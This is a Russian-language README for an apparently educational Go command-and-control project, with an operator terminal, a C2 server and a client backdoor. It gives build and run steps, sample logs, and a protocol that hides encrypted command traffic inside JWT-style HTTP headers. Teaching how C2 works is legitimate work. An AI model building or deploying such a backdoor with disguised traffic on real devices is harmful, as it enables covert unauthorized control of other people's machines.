# C2 Project - Удаленный доступ к устройству

## Описание
Комплект ПО для удаленного доступа к устройству, состоящий из трех компонентов:
- Терминал оператора - интерфейс для отправки команд
- C2-сервер - промежуточный компонент для агрегации задач
- Клиент - бэкдор, выполняющий команды

## Требования
- Go 1.21 или новее
- Операционная система: Windows, Linux или macOS
- Для выполнения Linux-команд на Windows: WSL (Windows Subsystem for Linux)

## Установка Go
Скачайте и установите Go с официального сайта: https://go.dev/dl/

## Структура проекта
```
c2-project/
├── bin/                 # Собранные исполняемые файлы
├── cmd/                 # Исходный код компонентов
│   ├── c2-server/       # C2-сервер
│   ├── client/          # Клиент (бэкдор)
│   └── terminal/        # Терминал оператора
├── configs/             # Конфигурационные файлы
│   ├── server.json      # Настройки сервера
│   ├── client.json      # Настройки клиента
│   └── terminal.json    # Настройки терминала
├── internal/            # Внутренние пакеты
│   ├── crypto/          # Шифрование и сжатие
│   ├── models/          # Структуры данных
│   └── protocol/        # Протокол передачи
├── go.mod
└── README.md
```

## Конфигурация
Перед запуском убедитесь, что конфигурационные файлы содержат правильные адреса.

### configs/server.json
```json
{
    "listen_address": ":8080"
}
```

### configs/client.json
```json
{
    "server_url": "http://localhost:8080",
    "client_id": "client-001",
    "poll_interval": 5
}
```

### configs/terminal.json
```json
{
    "server_url": "http://localhost:8080"
}
```

## Сборка проекта

### 1. Откройте терминал в папке проекта
```bash
cd c2-project
```

### 2. Установите зависимости
```bash
go mod tidy
```

### 3. Соберите все компоненты
```bash
go build -o bin/c2-server.exe ./cmd/c2-server
go build -o bin/client.exe ./cmd/client
go build -o bin/terminal.exe ./cmd/terminal
```

### 4. Сборка для Linux (если нужно)
```bash
GOOS=linux GOARCH=amd64 go build -o bin/c2-server ./cmd/c2-server
GOOS=linux GOARCH=amd64 go build -o bin/client ./cmd/client
GOOS=linux GOARCH=amd64 go build -o bin/terminal ./cmd/terminal
```

## Запуск

Важно! Запускайте все компоненты в отдельных окнах терминала.

Перед запуском перейдите в папку проекта:
```bash
cd C:\Users\ilyas\OneDrive\Рабочий стол\c2-project
```

### 1. Запуск C2-сервера
```bash
bin\c2-server.exe
```
Ожидаемый вывод:
```
C2 Server starting on :8080
```

### 2. Запуск клиента (на атакуемом устройстве)
```bash
bin\client.exe
```
Ожидаемый вывод:
```
[START] Client client-001 starting...
[OK] Registration successful
```

### 3. Запуск терминала оператора
```bash
bin\terminal.exe
```
Ожидаемый вывод:
```
=== C2 Terminal Operator ===
Введите команду или 'exit' для выхода
----------------------------------------
>
```

## Использование

1. Запустите C2-сервер (Окно 1)
2. Запустите клиент (Окно 2) - он автоматически зарегистрируется на сервере
3. Запустите терминал (Окно 3)
4. В терминале введите команду и нажмите Enter

Примеры команд:
- ls -la - список файлов (Linux/WSL)
- whoami - имя текущего пользователя
- hostname - имя компьютера
- dir - список файлов (Windows)
- echo "Hello" - вывод текста
- ps aux - список процессов (Linux)

## Пример работы

### Терминал оператора:
```
=== C2 Terminal Operator ===
Введите команду или 'exit' для выхода
----------------------------------------
> hostname
[INFO] Шифрование команды: hostname
[INFO] Команда зашифрована и отправлена на сервер (Task ID: 17876693681484808600)
[INFO] Ожидание результата...
[INFO] Получен зашифрованный результат
[INFO] Результат не сжат, показываю как есть
=== РЕЗУЛЬТАТ ===
DESKTOP-ABC123
==================
```

### Логи сервера:
```
[OK] Client registered: client-001
[TASK] Task created: 17876693681484808600 -> hostname
[TASK] Task 17876693681484808600 found for client client-001
[ENCRYPT] ADDITIONAL ENCRYPTION of task 17876693681484808600
[SEND] Encrypted task sent to client client-001
[RESULT] Result received: 17876693681484808600 -> completed
```

### Логи клиента:
```
[START] Client client-001 starting...
[OK] Registration successful
[DECRYPT] Decrypting received task
[DECRYPT] Task decrypted: hostname
[EXEC] Executing: hostname
[ENCRYPT] Encrypting result for task 17876693681484808600
[SEND] Encrypted result sent to server
```

## Протокол передачи данных
- Протокол: HTTP
- Шифрование: AES-256-GCM (симметричное)
- Маскировка: JWT (передача в заголовке Authorization: Bearer <token>)
- Сжатие: gzip (для результатов длиннее 500 байт)

## Безопасность
- Все данные шифруются AES-GCM
- Передача маскируется под JWT-аутентификацию
- Данные передаются в заголовках HTTP, а не в теле запроса

## Устранение неполадок

### Ошибка: "go: command not found"
Решение: Установите Go: https://go.dev/dl/

### Ошибка: "port 8080 already in use"
Решение: Закройте все окна с запущенным сервером и попробуйте снова.

### Ошибка: "Connection refused"
Решение: Убедитесь, что сервер запущен и конфигурации указывают на правильный адрес.

### Команды Linux не работают на Windows
Решение: Установите WSL (Windows Subsystem for Linux):
```powershell
wsl --install
```

## Важно
Данный проект имеет сугубо учебный характер. Не используйте в реальных сетях!
Разрабатывайте и тестируйте только в изолированном, виртуализированном пространстве.

## Автор
Хисматуллин Ильяс Рустемович
Группа: БББО-13-24